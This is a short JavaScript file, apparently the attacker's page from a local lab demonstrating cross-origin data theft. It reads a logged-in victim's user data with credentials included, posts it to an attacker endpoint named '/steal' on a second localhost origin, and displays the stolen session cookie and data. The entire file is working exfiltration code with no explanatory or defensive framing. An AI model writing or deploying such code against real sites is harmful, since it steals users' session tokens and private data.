const yourCookieEl = document.getElementById("your-cookie")

const victimOrigin = "http://localhost:5000"
const attackerOrigin = "http://localhost:9999"

fetch(victimOrigin + "/user/data", {
  credentials: "include"
})
  .then(res => res.json())
  .then(data => {
    fetch(attackerOrigin + "/steal", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    })
      .then(res2 => res2.json())
      .then(stolenData => {
        console.log(stolenData)
        yourCookieEl.innerHTML = `Victim's stolen cookie and data:<br>
          cookie: ${stolenData[0].sessionId}<br>
          data: ${stolenData[1].data}
          `
        yourCookieEl.style.display = "block"
      })
  })

/*const displayStolenCookie = async () => {
  const res = await fetch("http://localhost:9999/stolen")

  const stolen = await res.json()
  console.log(stolen)

  yourCookieEl.textContent = `Your stolen cookie: { sessionId: ${stolen[0].sessionId} } | Your stolen data: { data: ${stolen[1].data} }`
  yourCookieEl.style.display = "block"
}

displayStolenCookie()*/